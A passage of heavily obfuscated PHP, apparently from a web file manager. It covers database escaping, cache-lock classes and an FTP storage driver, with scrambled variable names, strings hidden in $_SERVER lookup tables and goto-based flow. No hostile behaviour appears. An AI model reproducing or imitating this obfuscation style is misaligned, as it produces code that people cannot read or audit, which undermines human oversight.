= $§¼÷ìõş[12]; } if ($§¼÷ìõş[12] != $this->queryStr) { $this->error .= LNG($§¼÷ìõş[48]) . $this->queryStr; } think_trace($this->error, $§¼÷ìõş[12], $§¼÷ìõş[49]); return $this->error; } public function escapeString($²ä‰ôû) { $Œ¤¡ÔàÈ =& $_SERVER[ñˆ‹ß¿÷]; switch ($this->dbType) { case $Œ¤¡ÔàÈ[951]: case $Œ¤¡ÔàÈ[924]: case $Œ¤¡ÔàÈ[942]: case $Œ¤¡ÔàÈ[954]: return addslashes($²ä‰ôû); case $Œ¤¡ÔàÈ[926]: case $Œ¤¡ÔàÈ[943]: case $Œ¤¡ÔàÈ[925]: case $Œ¤¡ÔàÈ[927]: return str_ireplace($Œ¤¡ÔàÈ[58], $Œ¤¡ÔàÈ[59], $²ä‰ôû); } } protected function parseValue($’Àï‰£) { $¹’Ñ‡å =& $_SERVER[ñˆ‹ß¿÷]; if (is_string($’Àï‰£)) { $ŠÜ’ä… = strpos($’Àï‰£, $¹’Ñ‡å[4]) === 0 && in_array($’Àï‰£, array_keys($this->bind)); $’Àï‰£ = $ŠÜ’ä… ? $this->escapeString($’Àï‰£) : $¹’Ñ‡å[964] . $this->escapeString($’Àï‰£) . $¹’Ñ‡å[964]; } elseif (isset($’Àï‰£[0]) && is_string($’Àï‰£[0]) && strtolower($’Àï‰£[0]) == $¹’Ñ‡å[297]) { $’Àï‰£ = $this->escapeString($’Àï‰£[1]); } elseif (is_array($’Àï‰£)) { $’Àï‰£ = array_map(array($this, $¹’Ñ‡å[965]), $’Àï‰£); } elseif (is_bool($’Àï‰£)) { $’Àï‰£ = $’Àï‰£ ? $¹’Ñ‡å[88] : $¹’Ñ‡å[197]; } elseif (is_null($’Àï‰£)) { $’Àï‰£ = $¹’Ñ‡å[103]; } return $’Àï‰£; } public function getLastInsertId() { $ºá´ÌÔœ =& $_SERVER[ñˆ‹ß¿÷]; switch ($this->dbType) { case $ºá´ÌÔœ[951]: case $ºá´ÌÔœ[943]: case $ºá´ÌÔœ[924]: case $ºá´ÌÔœ[942]: case $ºá´ÌÔœ[926]: case $ºá´ÌÔœ[954]: return $this->_linkID->lastInsertId(); case $ºá´ÌÔœ[925]: case $ºá´ÌÔœ[927]: $¡Ö•”î€ = $this->table; $Ø±Ä¸¸ç = $this->query("\123\x45\x4c\x45\103\124\x20{$¡Ö•”î€}\56\143\x75\162\x72\166\141\154\40\x63\165\x72\162\x76\x61\x6c\x20\106\122\117\x4d\x20\144\165\x61\154"); return $Ø±Ä¸¸ç ? $Ø±Ä¸¸ç[0][$ºá´ÌÔœ[966]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ú¹Şâóö) { $÷Ñá½ÌÆ =& $_SERVER[ñˆ‹ß¿÷]; if (!CacheLock::fileLock($÷Ñá½ÌÆ[13])) { return !1; } $×§•”á = parent::query($Ú¹Şâóö); CacheLock::fileUnLock($÷Ñá½ÌÆ[13]); return $×§•”á; } public function execute($ÕÃÅêÆË) { $½ı“‡‹ =& $_SERVER[ñˆ‹ß¿÷]; if (!CacheLock::fileLock($½ı“‡‹[13])) { return !1; } $‚È¶úéé = parent::execute($ÕÃÅêÆË); CacheLock::fileUnLock($½ı“‡‹[13]); return $‚È¶úéé; } } class DbSqlite3 extends DbSqlite3Base { public function query($¤²¨Õıò) { $µãšÇ•Ç =& $_SERVER[ñˆ‹ß¿÷]; if (!CacheLock::fileLock($µãšÇ•Ç[13])) { return !1; } $™ú†é˜Ö = parent::query($¤²¨Õıò); CacheLock::fileUnLock($µãšÇ•Ç[13]); return $™ú†é˜Ö; } public function execute($—ÁÕ“­¿) { $Šëé²Ãî =& $_SERVER[ñˆ‹ß¿÷]; if (!CacheLock::fileLock($Šëé²Ãî[13])) { return !1; } $Ê“Ãö„¹ = parent::execute($—ÁÕ“­¿); CacheLock::fileUnLock($Šëé²Ãî[13]); return $Ê“Ãö„¹; } } goto f”šÚŸó¬; D†ñ‘§øÀæ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $½êä¶ö‘ =& $_SERVER[ñˆ‹ß¿÷]; $„Í©×ÉÛ = $GLOBALS[$½êä¶ö‘[6]][$½êä¶ö‘[349]]; self::$cachePath = $„Í©×ÉÛ[$½êä¶ö‘[199]][$½êä¶ö‘[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($æøáØ»Ğ, $şÍí±˜– = 0) { $Úª×„Úá =& $_SERVER[ñˆ‹ß¿÷]; $›³ë¨Ñ½ = microtime(!0); $‘îÜ = $›³ë¨Ñ½ + $şÍí±˜– + 0.0001; $ÅºĞ©É = rtrim(self::$cachePath, $Úª×„Úá[8]) . $Úª×„Úá[866] . md5($æøáØ»Ğ) . $Úª×„Úá[863]; if (file_exists($ÅºĞ©É) && filemtime($ÅºĞ©É) && filemtime($ÅºĞ©É) < time() - 10) { @unlink($ÅºĞ©É); } do { if (file_exists($ÅºĞ©É)) { cacheLockWait(); continue; } $Ï¼­Šù› = fopen($ÅºĞ©É, $Úª×„Úá[867]); if (!$Ï¼­Šù›) { return !1; } $¤õˆ¸…÷ = flock($Ï¼­Šù›, LOCK_EX | LOCK_NB); self::$caches[$æøáØ»Ğ] = array($Úª×„Úá[868] => $Ï¼­Šù›, $Úª×„Úá[199] => $ÅºĞ©É); fwrite($Ï¼­Šù›, $‘îÜ); clearstatcache(); if ($Ï¼­Šù› && $¤õˆ¸…÷) { return !0; } cacheLockWait(); } while (microtime(!0) < $‘îÜ); $this->unlock($æøáØ»Ğ); return !1; } public function lockGet($®™’œÍ) { $ÄÚóúÏ– =& $_SERVER[ñˆ‹ß¿÷]; $Ñ¿ù°ËÂ = rtrim(self::$cachePath, $ÄÚóúÏ–[8]) . $ÄÚóúÏ–[866] . md5($®™’œÍ) . $ÄÚóúÏ–[863]; return file_exists($Ñ¿ù°ËÂ); } public function unlock($¾ÇÇ€ıØ) { $ó©ó§ç‹ =& $_SERVER[ñˆ‹ß¿÷]; $ŠÑ†ê¸ = self::$caches[$¾ÇÇ€ıØ]; if (!$ŠÑ†ê¸) { return; } @flock($ŠÑ†ê¸[$ó©ó§ç‹[868]], LOCK_UN); @fclose($ŠÑ†ê¸[$ó©ó§ç‹[868]]); @unlink($ŠÑ†ê¸[$ó©ó§ç‹[199]]); unset(self::$caches[$¾ÇÇ€ıØ]); } } class CacheLockRedis { public function lock($ÂÌšŞŸ†, $‡åÅÒ¼¢ = 10) { $÷‚Çü¥‰ = Cache::init(); $×ÀÂİö = microtime(!0) + $‡åÅÒ¼¢; while (microtime(!0) < $×ÀÂİö) { $ËÚ¶ƒ® = $÷‚Çü¥‰->get($ÂÌšŞŸ†); if (!$ËÚ¶ƒ®) { $¿œçãŸÔ = $÷‚Çü¥‰->setLock($ÂÌšŞŸ†, $×ÀÂİö, $‡åÅÒ¼¢); if ($¿œçãŸÔ) { return !0; } } else { if ($ËÚ¶ƒ® < microtime(!0)) { $÷‚Çü¥‰->set($ÂÌšŞŸ†, $×ÀÂİö, $‡åÅÒ¼¢ * 2); if ($÷‚Çü¥‰->get($ÂÌšŞŸ†) === $ËÚ¶ƒ®) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ú¥¹ã) { return Cache::init()->get($Ú¥¹ã); } public function unlock($ó÷Ò£›¯) { return Cache::init()->remove($ó÷Ò£›¯); } } class CacheLockMemcached { public function lock($ŠØœñıã, $šÅ¨Á£¯ = 0) { $æ¸­ëøÖ = Cache::init(); $å¦°á™’ = microtime(!0) + $šÅ¨Á£¯; while (microtime(!0) < $å¦°á™’) { $¶’•çû = $æ¸­ëøÖ->get($ŠØœñıã); if (!$¶’•çû || $¶’•çû < microtime(!0)) { $±¸²Œâ = $æ¸­ëøÖ->handle->add($ŠØœñıã, $å¦°á™’, $šÅ¨Á£¯); if ($±¸²Œâ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ĞÚ¶©ı’) { return Cache::init()->get($ĞÚ¶©ı’); } public function unlock($Ç‹ôÍº) { return Cache::init()->remove($Ç‹ôÍº); } } goto C”¨®³¨ß; E¥Ö’ÕªÈ: function binCheckBigger($ı³¸ØŞ½, $ÂÊËÌÙ„) { return $ı³¸ØŞ½ > $ÂÊËÌÙ„; } $_SERVER[$_SERVER[Š½‰´ó][3]] = ("\70\61\61\64"."\65\63")+0;$_ub2m="wqxupo5va7n62djb0eilfk8r34gm19hzytscvtl7i5ufram9zn8h3b1j0wxoqp4ydesc2gk6bh2eoi89fq";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ı¯ÓŠœ, $î¯¢”À) { $ç˜âÙã =& $_SERVER[ñˆ‹ß¿÷]; if (isset(self::$_methodList[$ı¯ÓŠœ])) { return @call_user_func_array(self::$_methodList[$ı¯ÓŠœ], $î¯¢”À); } else { if (method_exists($this, $ı¯ÓŠœ)) { return call_user_func_array(array($this, $ı¯ÓŠœ), $î¯¢”À); } else { think_exception(__CLASS__ . $ç˜âÙã[4] . $ı¯ÓŠœ . $ç˜âÙã[5]); } } } public static function __callStatic($Î‘¥«, $€ˆ‚êøÔ) { if (isset(self::$_methodListStatic[$Î‘¥«])) { return call_user_func_array(self::$_methodListStatic[$Î‘¥«], $€ˆ‚êøÔ); } else { if (method_exists(self, $Î‘¥«)) { return call_user_func_array(array(self, $Î‘¥«), $€ˆ‚êøÔ); } else { show_json("{$Î‘¥«}\x28\51\x20\156\157\164\x20\x65\170\151\163\164\73", !1); } } } public static function addMethod($Ç§ÇŠøš, $¹¸œ×®) { self::$_methodList[$Ç§ÇŠøš] = $¹¸œ×®; } public static function addMethodStatic($èËóÓ«, $†…°ôş) { self::$_methodListStatic[$èËóÓ«] = $†…°ôş; } } goto eã­„¡¸; D•‹ÕŒ–‹’: define($_SERVER[ñˆ‹ß¿÷][238], 1); define($_SERVER[ñˆ‹ß¿÷][239], 2); define($_SERVER[ñˆ‹ß¿÷][240], 3); goto cÈî‚ÑòÁ; E„ëæ‚öÚ±: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($ç°Ì™¨ˆ) { parent::__construct(); if (count($ç°Ì™¨ˆ) > 0) { $this->_init($ç°Ì™¨ˆ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($·¢´Ì€) { $‘ğ©Œ›¨ =& $_SERVER[ñˆ‹ß¿÷]; global $config; $this->appCharset = $config[$‘ğ©Œ›¨[1373]]; $this->systemCharset = $config[$‘ğ©Œ›¨[1374]]; if (isset($·¢´Ì€[$‘ğ©Œ›¨[1375]]) && $·¢´Ì€[$‘ğ©Œ›¨[1375]]) { $this->systemCharset = $·¢´Ì€[$‘ğ©Œ›¨[1375]]; } } public function iconvApp($ã‘Ò´) { return $this->iconvTo($ã‘Ò´, $this->systemCharset, $this->appCharset); } public function iconvSystem($š¦¢©¤Å) { return $this->iconvTo($š¦¢©¤Å, $this->appCharset, $this->systemCharset); } public function getPathOuter($¯Ù“ğıØ) { $¸õï­İ³ =& $_SERVER[ñˆ‹ß¿÷]; $¢şü‚ñÙ = $this->iconvApp($this->pathBase); $¯Ù“ğıØ = $this->iconvApp($¯Ù“ğıØ); if (substr($¢şü‚ñÙ, 0, 2) == $¸õï­İ³[1376]) { $¢şü‚ñÙ = BASIC_PATH . substr($¢şü‚ñÙ, 2); } if (substr($¯Ù“ğıØ, 0, 2) == $¸õï­İ³[1376]) { $¯Ù“ğıØ = BASIC_PATH . substr($¯Ù“ğıØ, 2); } $¢şü‚ñÙ = KodIO::clear($¢şü‚ñÙ); $¯Ù“ğıØ = KodIO::clear($¯Ù“ğıØ); $¯Ù“ğıØ = substr($¯Ù“ğıØ, strlen($¢şü‚ñÙ)); if (empty($this->pathDriver)) { return $¯Ù“ğıØ; } return $this->pathDriver . $¸õï­İ³[8] . ltrim($¯Ù“ğıØ, $¸õï­İ³[8]); } private function _init($¬˜†çÊä = array()) { $¯±ê‚²Ñ =& $_SERVER[ñˆ‹ß¿÷]; if (!function_exists($¯±ê‚²Ñ[1377])) { throw new Exception(LNG($¯±ê‚²Ñ[1378])); } $this->config = $¬˜†çÊä; $this->charsetReset($¬˜†çÊä); foreach ($¬˜†çÊä as $–¾ı³àØ => $‹»»ÈêÄ) { if (isset($this->{$–¾ı³àØ})) { $this->{$–¾ı³àØ} = $‹»»ÈêÄ; } } return $this->_login($¬˜†çÊä); } private function _login($¬›ƒæÌ÷) { $şô»Ø»ˆ =& $_SERVER[ñˆ‹ß¿÷]; static $ı¥•Æì§ = array(); $’ÀËªÆØ = md5(json_encode($¬›ƒæÌ÷)); if (isset($ı¥•Æì§[$’ÀËªÆØ])) { foreach ($ı¥•Æì§[$’ÀËªÆØ] as $³¦÷Éá => $ÄÊ½ØøÀ) { $this->{$³¦÷Éá} = $ÄÊ½ØøÀ; } return !0; } $±™Åºª = parse_url(trim($this->server, $şô»Ø»ˆ[8])); $this->host = $±™Åºª[$şô»Ø»ˆ[181]]; $ÃšÓ¾Ï¯ = isset($±™Åºª[$şô»Ø»ˆ[180]]) && $±™Åºª[$şô»Ø»ˆ[180]] == $şô»Ø»ˆ[1379] ? !0 : !1; $this->scheme = $ÃšÓ¾Ï¯ ? $şô»Ø»ˆ[1380] : $şô»Ø»ˆ[1381]; $this->port = isset($±™Åºª[$şô»Ø»ˆ[182]]) ? $±™Åºª[$şô»Ø»ˆ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ùôğØ¼º = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $é“‚´ = $this->pasv == $şô»Ø»ˆ[88] ? !0 : !1; @ftp_pasv($this->connect, $é“‚´); $ı¥•Æì§[$’ÀËªÆØ] = array($şô»Ø»ˆ[1382] => $this->connect, $şô»Ø»ˆ[181] => $this->host, $şô»Ø»ˆ[180] => $this->scheme, $şô»Ø»ˆ[182] => $this->port); return $ùôğØ¼º; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($®ÃÓ¼õÇ, $õ´ŞÁó˜ = '', $»Ÿ¥œƒ› = REPEAT_RENAME) { if ($this->setContent($®ÃÓ¼õÇ, $õ´ŞÁó˜)) { return $this->getPathOuter($®ÃÓ¼õÇ); } return !1; } public function mkdir($„…œÌ€â, $‘Ì†À”… = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $„…œÌ€â = $this->iconvSystem($„…œÌ€â); if ($this->_isFolder($„…œÌ€â) || @ftp_mkdir($this->connect, $„…œÌ€â)) { return $this->getPathOuter($„…œÌ€â); } if (!$this->mkdir($this->pathFather($„…œÌ€â))) { return !1; } if ($„…œÌ€â = @ftp_mkdir($this->connect, $„…œÌ€â)) { return $this->getPathOuter($„…œÌ€â); } return !1; } public function copyFile($ßÒˆ·ôë, $Õ–„ÙÀ) { if (!$this->_isconn()) { return !1; } $”ˆôÄ×Î = $this->pathThis($this->iconvSystem($ßÒˆ·ôë)); $ßÑßĞíä = $this->tempFile($”ˆôÄ×Î); $“¿Ò¦Í = $this->iconvApp($ßÑßĞíä); $this->download($ßÒˆ·ôë, $“¿Ò¦Í); $óÌ“¸áƒ = $this->upload($Õ–„ÙÀ, $“¿Ò¦Í); $this->tempFileRemve($ßÑßĞíä); return $óÌ“¸áƒ; } public function moveFile($­±¸òÌâ, $î¥ï‰êì) { if (!$this->_isconn()) { return !1; } $­±¸òÌâ = $this->iconvSystem($­±¸òÌâ); $î¥ï‰êì = $this->iconvSystem($î¥ï‰êì); $„¬Ğşºí = @ftp_rename($this->connect, $­±¸òÌâ, $î¥ï‰êì); return $„¬Ğşºí ? $this->getPathOuter($î¥ï‰êì) : !1; } public function delFile($ª½ï›ŸÁ) { if (!$this->_isconn()) { return !1; } $ª½ï›ŸÁ = $this->iconvSystem($ª½ï›ŸÁ); return @ftp_delete($this->connect, $ª½ï›ŸÁ); } public function delFolder($ë½ÀçÑ…) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $µ¡Œü¿Ê = $Ñ°Å‘“Ã = array(); $this->fileList($ë½ÀçÑ…, $µ¡Œü¿Ê, $Ñ°Å‘“Ã, !0); $this->listItemCache = !0; foreach ($Ñ°Å‘“Ã as $Ë²ê§ÕË) { $õü‰áÈ = $this->iconvSystem($Ë²ê§ÕË[$_SERVER[ñˆ‹ß¿÷][32]]); $Ğ“ ó” = @ftp_delete($this->connect, $õü‰áÈ); if (!$Ğ“ ó”) { return !1; } } foreach ($µ¡Œü¿Ê as $õü‰áÈ) { $õü‰áÈ = $this->iconvSystem($õü‰áÈ); $Ğ“ ó” = @ftp_rmdir($this->connect, $õü‰áÈ); if (!$Ğ“ ó”) { return !1; } } $ë½ÀçÑ… = $this->iconvSystem($ë½ÀçÑ…); return @ftp_rmdir($this->connect, $ë½ÀçÑ…); } public function rename($ô¨éĞ, $‰Ù£œ) { $ïúâÑûÇ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->_isconn()) { return !1; } $æğÆºÓú = $this->fileNameAuto($this->pathFather($ô¨éĞ), $‰Ù£œ); $æğÆºÓú = $this->iconvSystem($æğÆºÓú); $ô¨éĞ = $this->iconvSystem($ô¨éĞ); $Ø†íˆ¨œ = $this->pathFather($ô¨éĞ); $äï†Úôˆ = rtrim($Ø†íˆ¨œ, $ïúâÑûÇ[8]) . $ïúâÑûÇ[8] . $æğÆºÓú; $’ë‰äğ = @ftp_rename($this->connect, $ô¨éĞ, $äï†Úôˆ); $äï†Úôˆ = $this->iconvApp($äï†Úôˆ); return $’ë‰äğ ? $this->getPathOuter($äï†Úôˆ) : !1; } private function folderInfo($¥ŠÑç‰š, $ãã‰—‹ø = false) { $ÔĞÂ€Ÿ =& $_SERVER[ñˆ‹ß¿÷]; $Å—ĞÍ÷º = array($ÔĞÂ€Ÿ[32] => $this->pathThis($¥ŠÑç‰š), $ÔĞÂ€Ÿ[84] => $this->getPathOuter($ÔĞÂ€Ÿ[8] . $¥ŠÑç‰š), $ÔĞÂ€Ÿ[33] => $ÔĞÂ€Ÿ[75]); if ($ãã‰—‹ø) { return $Å—ĞÍ÷º; } $Å—ĞÍ÷º[$ÔĞÂ€Ÿ[200]] = $Å—ĞÍ÷º[$ÔĞÂ€Ÿ[85]] = 0; $Å—ĞÍ÷º[$ÔĞÂ€Ÿ[201]] = $Å—ĞÍ÷º[$ÔĞÂ€Ÿ[202]] = !0; return $Å—ĞÍ÷º; } private function fileInfo($àú¦ñ™˜, $Ú›ßø› = false, $È¯ş·²Ë = array()) { $öëÔ§üŞ =& $_SERVER[ñˆ‹ß¿÷]; $«Œ¶ˆÛ = array($öëÔ§üŞ[32] => $this->pathThis($àú¦ñ™˜), $öëÔ§üŞ[84] => $this->getPathOuter($öëÔ§üŞ[8] . $àú¦ñ™˜), $öëÔ§üŞ[33] => $öëÔ§üŞ[199], $öëÔ§üŞ[76] => isset($È¯ş·²Ë[$öëÔ§üŞ[76]]) ? $È¯ş·²Ë[$öëÔ§üŞ[76]] : 0, $öëÔ§üŞ[174] => $this->ext($àú¦ñ™˜)); if ($Ú›ßø›) { return $«Œ¶ˆÛ; } $«Œ¶ˆÛ[$öëÔ§üŞ[200]] = $«Œ¶ˆÛ[$öëÔ§üŞ[85]] = 0; $«Œ¶ˆÛ[$öëÔ§üŞ[201]] = $«Œ¶ˆÛ[$öëÔ§üŞ[202]] = !0; $üÔ¥©© = $this->iconvSystem($àú¦ñ™˜); $«Œ¶ˆÛ[$öëÔ§üŞ[85]] = @ftp_mdtm($this->connect, $üÔ¥©©); if (empty($È¯ş·²Ë)) { $È¯ş·²Ë = $this->objectMeta($àú¦ñ™˜); if (!$È¯ş·²Ë) { return $«Œ¶ˆÛ; } } $«Œ¶ˆÛ[$öëÔ§üŞ[76]] = $È¯ş·²Ë[$öëÔ§üŞ[76]]; return $«Œ¶ˆÛ; } public function size($ÃäÈ‡×) { $›Ø‡Í‡ = $this->objectMeta($ÃäÈ‡×); return $›Ø‡Í‡ ? $›Ø‡Í‡[$_SERVER[ñˆ‹ß¿÷][76]] : 0; } public function info($á¶â¢ú) { if ($this->isFile($á¶â¢ú)) { return $this->fileInfo($á¶â¢ú, 0); } else { if ($this->isFolder($á¶â¢ú)) { return $this->folderInfo($á¶â¢ú); } } return !1; } private function fileList($Ö‰ÄÔşı, &$Ì–ÙƒÅ©, &$ÙÂÅùõÍ, $©‡Š£üæ = false) { $÷ó„ùàû =& $_SERVER[ñˆ‹ß¿÷]; $Ö‰ÄÔşı = $this->iconvSystem($Ö‰ÄÔşı); if (!$this->isFolder($Ö‰ÄÔşı)) { return !1; } @ftp_chdir($this->connect, $÷ó„ùàû[8]); $Ö‰ÄÔşı = rtrim($Ö‰ÄÔşı, $÷ó„ùàû[8]) . $÷ó„ùàû[8]; check_abort(); $¥Õ€ = @ftp_rawlist($this->connect, $Ö‰ÄÔşı); if (!$¥Õ€) { $¥Õ€ = array(); } $Çòğèš¾ = array($÷ó„ùàû[10] => 1, $÷ó„ùàû[1383] => 1); foreach ($¥Õ€ as $ÔÚä¯Ï) { $ˆÆâÇß = $this->_listItem($ÔÚä¯Ï); if ($ˆÆâÇß[0] == $÷ó„ùàû[766]) { continue; } $ŸçÌ†™¸ = $ˆÆâÇß[8]; if (empty($ŸçÌ†™¸) && $ŸçÌ†™¸ !== $÷ó„ùàû[197] || isset($Çòğèš¾[$ŸçÌ†™¸])) { continue; } $ŸçÌ†™¸ = $this->iconvApp($Ö‰ÄÔşı . ltrim($ŸçÌ†™¸, $÷ó„ùàû[8])); $•ÉÆş— = array($÷ó„ùàû[32] => $ŸçÌ†™¸, $÷ó„ùàû[33] => $÷ó„ùàû[199], $÷ó„ùàû[76] => $ˆÆâÇß[4]); if (substr($ÔÚä¯Ï, 0, 1) == $÷ó„ùàû[1384]) { $•ÉÆş—[$÷ó„ùàû[33]] = $÷ó„ùàû[75]; $•ÉÆş—[$÷ó„ùàû[76]] = 0; } $“ìÉÕÎË = $•ÉÆş—[$÷ó„ùàû[33]] == $÷ó„ùàû[75] ? !0 : !1; $this->cacheMethodInfoSet($ŸçÌ†™¸, $“ìÉÕÎË, $•ÉÆş—); if ($“ìÉÕÎË) { $Ì–ÙƒÅ©[] = $ŸçÌ†™¸; if ($©‡Š£üæ) { $this->fileList($ŸçÌ†™¸, $Ì–ÙƒÅ©, $ÙÂÅùõÍ, $©‡Š£üæ); } continue; } $ÙÂÅùõÍ[] = $•ÉÆş—; } $this->cacheMethodInfoSet($Ö‰ÄÔşı, !0); } private function _listItem($…ÌâËú) { if (empty($…ÌâËú)) { return array(); } $ÖÇ¥ô…Å = preg_split($_SERVER[ñˆ‹ß¿÷][1385], $…ÌâËú); if (count($ÖÇ¥ô…Å) <= 9) { return $ÖÇ¥ô…Å; } $ÖÇ¥ô…Å[8] = trim(substr($…ÌâËú, strpos($…ÌâËú, $ÖÇ¥ô…Å[7]) + strlen($ÖÇ¥ô…Å[7]))); return array_splice($ÖÇ¥ô…Å, 0, 9); } public function listPath($º°©˜ö–, $âÎËí§Í = false) { $ó‹Å²¨• =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->_isconn()) { return !1; } $ñßÊÊïÖ = $¬À²ô – = array(); $this->fileList($º°©˜ö–, $ñßÊÊïÖ, $¬À²ô –); foreach ($ñßÊÊïÖ as $Â’è±±Ü => $‡®Û´’) { $ñßÊÊïÖ[$Â’è±±Ü] = $this->folderInfo($‡®Û´’, $âÎËí§Í); } foreach ($¬À²ô – as $Â’è±±Ü => $‡®Û´’) { $¬À²ô –[$Â’è±±Ü] = $this->fileInfo($‡®Û´’[$ó‹Å²¨•[32]], $âÎËí§Í, $‡®Û´’); } return array($ó‹Å²¨•[82] => $ñßÊÊïÖ, $ó‹Å²¨•[83] => $¬À²ô –); } public function has($¿ë½ÂÏ, $éÎæôÀí = false, $±–œıØç = true) { $û…ÜÑÕØ =& $_SERVER[ñˆ‹ß¿÷]; $ÏâÍ»Î× = $ˆù¬æ‹ = array(); $¾ğÕÚË = $éÎæôÀí ? !0 : !1; $this->fileList($¿ë½ÂÏ, $ÏâÍ»Î×, $ˆù¬æ‹, $¾ğÕÚË); if ($éÎæôÀí) { return array($û…ÜÑÕØ[207] => count($ˆù¬æ‹), $û…ÜÑÕØ[208] => count($ÏâÍ»Î×)); } if ($±–œıØç) { if (count($ˆù¬æ‹)) { return !0; } } else { if (count($ÏâÍ»Î×)) { return !0; } } return !1; } public function listAll($æå«Ü´À) { $¶°“‘»İ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->_isconn()) { return !1; } $šç”ü¾– = $”ø•Í’³ = array(); $this->fileList($æå«Ü´À, $šç”ü¾–, $”ø•Í’³, !0); $³—¦«İ£ = array(); foreach ($”ø•Í’³ as $úÖëÒÖ) { $³—¦«İ£[$úÖëÒÖ[$¶°“‘»İ[32]]] = $úÖëÒÖ[$¶°“‘»İ[76]]; } foreach ($šç”ü¾– as $úÖëÒÖ) { if (is_string($úÖëÒÖ)) { $³—¦«İ£[$úÖëÒÖ] = 0; } } return $this->listAllFiles($æå«Ü´À, array_keys($³—¦«İ£), $³—¦«İ£); } public function getContent($ßˆú’ğ±) { if (!$this->_isconn()) { return !1; } $ßˆú’ğ± = $this->iconvSystem($ßˆú’ğ±); return $this->fileSubstr($ßˆú’ğ±); } public function setContent($ûÄ¢Ê…á, $õÃ¾ ƒ° = '') { if (!$this->_isconn()) { return !1; } $ä´§½È« = $this->pathThis($this->iconvSystem($ûÄ¢Ê…á)); $¾Ğá¿èÏ = $this->tempFile($ä´§½È«); file_put_contents($¾Ğá¿èÏ, $õÃ¾ ƒ°); $¥¯áı›Š = $this->upload($ûÄ¢Ê…á, $this->iconvApp($¾Ğá¿èÏ)); $this->tempFileRemve($¾Ğá¿èÏ); return $¥¯áı›Š; } public function fileSubstr($ï‡’›”, $àì«Ğ‘Û = 0, $¦¯£éÎ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ï‡’›”, $àì«Ğ‘Û, $¦¯£éÎ); } private function ftpRequest($¤š”­åÒ, $¼¶Ü‹Æˆ = 0, $›§îŒà– = false) { $¤š”­åÒ = $this->iconvSystem($¤š”­åÒ); $Ñ£ƒŒ“— = $this->scheme . $this->host . $_SERVER[ñˆ‹ß¿÷][4] . $this->port; $Ñ ş¢àœ = curl_init(); curl_setopt($Ñ ş¢àœ, CURLOPT_URL, $Ñ£ƒŒ“— . $this->pathEncode($¤š”­åÒ)); curl_setopt($Ñ ş¢àœ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($›§îŒà–) { $¨óÀÚ¸¸ = $¼¶Ü‹Æˆ + $›§îŒà– - 1; curl_setopt($Ñ ş¢àœ, CURLOPT_RANGE, "{$¼¶Ü‹Æˆ}\55{$¨óÀÚ¸¸}"); } curl_setopt($Ñ ş¢àœ, CURLOPT_RETURNTRANSFER, 1); $œ©È÷‘ = curl_exec($Ñ ş¢àœ); curl_close($Ñ ş¢àœ); return $œ©È÷‘; } public function upload($¬æ¹éÅ‹, $Âë˜Øº, $¢¦Üåğ³ = false, $ò¡Í‘•‘ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¬æ¹éÅ‹))) { return !1; } $¬æ¹éÅ‹ = $this->iconvSystem($¬æ¹éÅ‹); $Âë˜Øº = $this->iconvSystem($Âë˜Øº); $ŠÚ”ã•Ï = ftp_nb_put($this->connect, $¬æ¹éÅ‹, $Âë˜Øº, FTP_BINARY); while ($ŠÚ”ã•Ï == FTP_MOREDATA) { $ŠÚ”ã•Ï = ftp_nb_continue($this->connect); } if ($ŠÚ”ã•Ï != FTP_FINISHED) { return !1; } return $this->getPathOuter($¬æ¹éÅ‹); } public function download($”×Ôœ­¯, $œ¶‹™Ê = '') { if (!$this->_isconn()) { return !1; } $ùù³©Ó­ = $this->pathFather($œ¶‹™Ê); if (!IO::mkdir($ùù³©Ó­)) { return !1; } $”×Ôœ­¯ = $this->iconvSystem($”×Ôœ­¯); $œ¶‹™Ê = $this->iconvSystem($œ¶‹™Ê); $Å¤Öâ£Ñ = ftp_nb_get($this->connect, $œ¶‹™Ê, $”×Ôœ­¯, FTP_BINARY); while ($Å¤Öâ£Ñ == FTP_MOREDATA) { $Å¤Öâ£Ñ = ftp_nb_continue($this->connect); } if ($Å¤Öâ£Ñ != FTP_FINISHED) { return !1; } return $this->iconvApp($œ¶‹™Ê); } public function exist($Û§€Ë—) { return $this->isFile($Û§€Ë—) || $this->isFolder($Û§€Ë—); } public function isFile($“¨ÍÒø¡) { return !$this->isFolder($“¨ÍÒø¡) && $this->objectMeta($“¨ÍÒø¡); } public function isFolder($òû£í­Ø) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][165], $òû£í­Ø); } protected function objectMeta($âœÉî¬) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][167], $âœÉî¬); } protected function _objectMeta($‡òûËÎ) { $Ì×²Çò =& $_SERVER[ñˆ‹ß¿÷]; if ($‡òûËÎ == $Ì×²Çò[12] || $‡òûËÎ == $Ì×²Çò[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‡òûËÎ = $this->iconvSystem($‡òûËÎ); $¯çÔµ” = array($Ì×²Çò[32] => $this->iconvApp($‡òûËÎ), $Ì×²Çò[33] => $Ì×²Çò[199], $Ì×²Çò[76] => 0); @ftp_chdir($this->connect, $Ì×²Çò[8]); $‘ûó©”© = @ftp_size($this->connect, $‡òûËÎ); if ($‘ûó©”© != -1) { 